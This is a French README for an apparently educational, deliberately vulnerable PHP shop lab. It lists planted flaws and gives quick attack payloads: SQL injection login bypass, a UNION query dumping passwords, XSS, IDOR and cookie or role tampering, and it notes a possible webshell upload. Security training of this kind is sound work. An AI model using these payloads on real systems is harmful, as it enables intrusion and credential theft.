# TechStore - Site Vulnérable pour Formation Cybersécurité

Site e-commerce volontairement vulnérable pour démonstrations et formations en sécurité web.

---

## Installation XAMPP

### 1. Copier les fichiers

Copie le dossier `vulnerable_shop` dans:
```
C:\xampp\htdocs\Pedagogie_Web\vulnerable_shop
```

### 2. Démarrer XAMPP

Lance **XAMPP Control Panel** et démarre:
- **Apache** (vert)
- **MySQL** (vert)

### 3. Importer la base de données

1. Va sur: `http://localhost/phpmyadmin`
2. Clique sur **Importer**
3. Sélectionne: `vulnerable_shop/database/setup.sql`
4. Clique **Exécuter**

### 4. Accéder au site

```
http://localhost/Pedagogie_Web/vulnerable_shop/
```

---

## Comptes de test

| Username | Password | Rôle |
|----------|----------|------|
| `admin` | `admin123` | Admin |
| `user1` | `password` | User |
| `test` | `motdepasse123` | User (mot de passe en clair dans la BDD) |

---

## Liste des vulnérabilités

| # | Type | Page | Sévérité |
|---|------|------|----------|
| 1 | SQL Injection | login.php | Critique |
| 2 | SQL Injection | products.php | Critique |
| 3 | SQL Injection UNION | products.php | Critique |
| 4 | SQL Injection | product.php | Haute |
| 5 | XSS Réfléchi | products.php | Moyenne |
| 6 | XSS Stocké | product.php | Haute |
| 7 | IDOR | orders.php | Haute |
| 8 | Privilege Escalation | profile.php | Critique |
| 9 | Cookie Tampering | admin/ | Critique |
| 10 | File Upload | profile.php | Critique |
| 11 | Information Disclosure | Toutes | Basse |

---

## Attaques rapides

### SQL Injection - Login
```
Username: admin'#
Password: test
```
**Résultat:** Connecté en admin

### SQL Injection - Voir les mots de passe
```
Recherche: ' UNION SELECT 1,username,3,4,5,6,password FROM users#
```
**Résultat:** Affiche les mots de passe (test = motdepasse123 en clair)

### XSS
```
Recherche: <script>alert(1)</script>
```
**Résultat:** Popup JavaScript

### IDOR
```
URL: orders.php?order_id=1
```
**Résultat:** Voir les commandes des autres utilisateurs

### Élévation de privilèges
```
F12 > Console > document.querySelector('input[name="role"]').value='admin'
```
**Résultat:** Devenir admin

### Cookie Admin
```
F12 > Console > document.cookie="role=admin; path=/"
```
**Résultat:** Accès admin sans login

---

## Utilisation avec Ollama/Llama3

```bash
ollama run llama3
```

Exemple de prompt:
```
Je teste un site vulnérable. Voici le code PHP du login:
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
Comment exploiter cette injection SQL?
```

---

## Documentation complète

Voir le fichier `VULNERABILITIES.md` pour les explications détaillées de chaque attaque.

---

## Avertissement

**CE SITE EST VOLONTAIREMENT VULNÉRABLE**

- Ne jamais déployer en production
- Ne jamais exposer sur Internet
- Usage local uniquement
- Fins éducatives uniquement

---

## Structure du projet

```
vulnerable_shop/
├── config/
│   └── database.php       # Config MySQL
├── database/
│   └── setup.sql          # Script création BDD
├── admin/
│   └── dashboard.php      # Panel admin
├── uploads/
│   └── avatars/           # Uploads (webshell possible)
├── assets/
│   └── css/style.css      # Styles
├── index.php              # Accueil
├── login.php              # Connexion (SQLi)
├── register.php           # Inscription
├── logout.php             # Déconnexion
├── products.php           # Produits (SQLi, XSS)
├── product.php            # Détail (SQLi, XSS stocké)
├── orders.php             # Commandes (IDOR)
├── profile.php            # Profil (Privilege, Upload)
├── VULNERABILITIES.md     # Documentation attaques
└── README.md              # Ce fichier
```
